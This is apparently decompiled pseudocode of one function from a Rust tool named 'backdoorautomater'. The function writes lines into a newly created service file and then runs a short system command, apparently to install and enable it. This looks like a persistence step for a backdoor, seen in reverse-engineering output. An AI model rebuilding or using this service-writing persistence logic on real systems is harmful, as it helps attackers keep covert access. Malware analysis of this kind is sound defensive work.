long _ZN17backdoorautomater13modifyservice13write_service17hc4c312686b13b0b4E
               (undefined8 *param_1,undefined8 *param_2,undefined8 param_3)

{
  long lVar1;
  undefined8 uVar2;
  int local_1dc;
  undefined local_1d8 [16];
  undefined *local_1c8;
  undefined4 local_1b8;
  undefined4 uStack_1b4;
  undefined4 uStack_1b0;
  undefined4 uStack_1ac;
  undefined8 local_1a8;
  undefined4 local_1a0;
  undefined4 uStack_19c;
  undefined4 uStack_198;
  undefined4 uStack_194;
  undefined8 local_190;
  undefined4 local_168;
  undefined4 uStack_164;
  undefined4 uStack_160;
  undefined4 uStack_15c;
  undefined8 local_158;
  undefined4 local_148;
  undefined4 uStack_144;
  undefined4 uStack_140;
  undefined4 uStack_13c;
  undefined8 local_138;
  undefined8 local_128;
  undefined8 local_120;
  undefined8 local_108;
  long lStack_100;
  undefined8 local_f8;
  undefined8 uStack_f0;
  undefined4 uStack_e8;
  undefined4 uStack_e4;
  undefined8 local_e0;
  
  local_f8 = (undefined *)param_2[2];
  local_108 = (undefined *)*param_2;
  lStack_100 = param_2[1];
  uStack_f0 = *param_1;
  uStack_e8 = *(undefined4 *)(param_1 + 1);
  uStack_e4 = *(undefined4 *)((long)param_1 + 0xc);
  local_e0 = param_1[2];
                    /* try { // try from 00155ad2 to 00155af0 has its CatchHandler @ 00155e10 */
  _ZN5alloc3str17join_generic_copy17h6e3e6eb2fb0da332E(&local_1a0,&local_108,2,1,0);
  local_1a8 = local_190;
  local_1b8 = local_1a0;
  uStack_1b4 = uStack_19c;
  uStack_1b0 = uStack_198;
  uStack_1ac = uStack_194;
                    /* try { // try from 00155b05 to 00155b58 has its CatchHandler @ 00155e3b */
  _ZN4core3ptr63drop_in_place_LT__u5b_alloc__string__String_u3b__u20_2_u5d__GT_17hfd07afc6d277b85dE
            (&local_108);
  local_108 = &DAT_002660c6;
  lStack_100 = 10;
  local_f8 = (undefined *)CONCAT44(uStack_1ac,uStack_1b0);
  uStack_f0 = local_1a8;
  _ZN5alloc3str17join_generic_copy17hc78a65dc4338aaa9E(&local_1a0,&local_108,2,1,0);
  local_158 = local_190;
  local_168 = local_1a0;
  uStack_164 = uStack_19c;
  uStack_160 = uStack_198;
  uStack_15c = uStack_194;
                    /* try { // try from 00155b73 to 00155b84 has its CatchHandler @ 00155e36 */
  _ZN3std2fs4File6create17he97042899d0016f9E(&local_108,&local_1b8);
  lVar1 = lStack_100;
  if ((int)local_108 == 0) {
    local_1dc = local_108._4_4_;
                    /* try { // try from 00155bbe to 00155bc5 has its CatchHandler @ 00155e22 */
    local_1d8 = _ZN94__LT__RF_alloc__vec__Vec_LT_T_C_A_GT__u20_as_u20_core__iter__traits__collect__IntoIterator_GT_9into_iter17he83e32c7780ec148E
                          (param_3);
    lVar1 = _ZN91__LT_core__slice__iter__Iter_LT_T_GT__u20_as_u20_core__iter__traits__iterator__Iterator_GT_4next17h91a7ac74cc99056eE
                      (local_1d8);
    if (lVar1 != 0) {
      do {
        local_108 = *(undefined **)(lVar1 + 8);
        lStack_100 = *(long *)(lVar1 + 0x10);
        local_f8 = &DAT_00265765;
        uStack_f0 = 1;
                    /* try { // try from 00155c37 to 00155c4e has its CatchHandler @ 00155e52 */
        _ZN5alloc3str17join_generic_copy17hc78a65dc4338aaa9E(&local_1a0,&local_108,2,1,0);
        local_138 = local_190;
        local_148 = local_1a0;
        uStack_144 = uStack_19c;
        uStack_140 = uStack_198;
        uStack_13c = uStack_194;
                    /* try { // try from 00155c71 to 00155c78 has its CatchHandler @ 00155e40 */
        lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E
                          (&local_1dc,CONCAT44(uStack_194,uStack_198));
        if (lVar1 != 0) {
                    /* try { // try from 00155dc5 to 00155dd1 has its CatchHandler @ 00155e22 */
          _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_148);
                    /* try { // try from 00155dd6 to 00155dda has its CatchHandler @ 00155e36 */
          _ZN4core3ptr34drop_in_place_LT_std__fs__File_GT_17hb99078073e1bf56bE(local_1dc);
          goto LAB_00155b97;
        }
                    /* try { // try from 00155c85 to 00155c8c has its CatchHandler @ 00155e52 */
        _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_148);
        lVar1 = _ZN91__LT_core__slice__iter__Iter_LT_T_GT__u20_as_u20_core__iter__traits__iterator__Iterator_GT_4next17h91a7ac74cc99056eE
                          (local_1d8);
      } while (lVar1 != 0);
    }
                    /* try { // try from 00155c9e to 00155cb6 has its CatchHandler @ 00155e22 */
    _ZN3std7process7Command3new17hc59b10cf3f1b2adaE(&local_108,&DAT_002657bf,2);
                    /* try { // try from 00155cb7 to 00155d06 has its CatchHandler @ 00155e24 */
    uVar2 = _ZN3std7process7Command3arg17ha1bca970e684ecbeE(&local_108,&DAT_002657c1,2);
    uVar2 = _ZN3std7process7Command3arg17h1a6c514e95e1ad22E(uVar2,&local_168);
    (*(code *)PTR__ZN3std7process7Command6output17hf2f7777b705db8a9E_00368e98)(&local_1a0,uVar2);
    _ZN4core6result19Result_LT_T_C_E_GT_6expect17h4dac3b1149b99667E
              (&local_148,&local_1a0,&PTR_DAT_00329f60);
                    /* try { // try from 00155d07 to 00155d2e has its CatchHandler @ 00155dfe */
    _ZN4core3ptr42drop_in_place_LT_std__process__Command_GT_17h60da061aa1df0d14E(&local_108);
    (*(code *)PTR__ZN5alloc6string6String15from_utf8_lossy17h7ed9087fa43d10adE_00368300)
              (&local_1a0,local_128,local_120);
                    /* try { // try from 00155d2f to 00155d48 has its CatchHandler @ 00155def */
    uVar2 = _ZN71__LT_alloc__borrow__Cow_LT_B_GT__u20_as_u20_core__ops__deref__Deref_GT_5deref17ha2c16a4b1cc76445E
                      (&local_1a0);
    _ZN52__LT_T_u20_as_u20_alloc__slice__hack__ConvertVec_GT_6to_vec17h4aa1dd8ab670f689E
              (&local_108,uVar2);
    local_1c8 = local_f8;
    local_1d8._0_8_ = local_108;
    local_1d8._8_8_ = lStack_100;
                    /* try { // try from 00155d63 to 00155d76 has its CatchHandler @ 00155de0 */
    _ZN4core3ptr50drop_in_place_LT_alloc__borrow__Cow_LT_str_GT__GT_17hb5385058f177b775E(&local_1a0)
    ;
    _ZN17backdoorautomater9sanitizer23sanitize_system_command17hc9c6071c8b9b108cE(local_1d8);
                    /* try { // try from 00155d77 to 00155d80 has its CatchHandler @ 00155dfe */
    _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(local_1d8);
                    /* try { // try from 00155d81 to 00155d8d has its CatchHandler @ 00155e22 */
    _ZN4core3ptr41drop_in_place_LT_std__process__Output_GT_17h78d1e539beaf0e46E(&local_148);
                    /* try { // try from 00155d92 to 00155d96 has its CatchHandler @ 00155e36 */
    _ZN4core3ptr34drop_in_place_LT_std__fs__File_GT_17hb99078073e1bf56bE(local_1dc);
                    /* try { // try from 00155d97 to 00155da3 has its CatchHandler @ 00155e3b */
    _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_168);
    _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_1b8);
    lVar1 = 0;
  }
  else {
LAB_00155b97:
                    /* try { // try from 00155b97 to 00155ba3 has its CatchHandler @ 00155e3b */
    _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_168);
    _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_1b8);
  }
  return lVar1;
}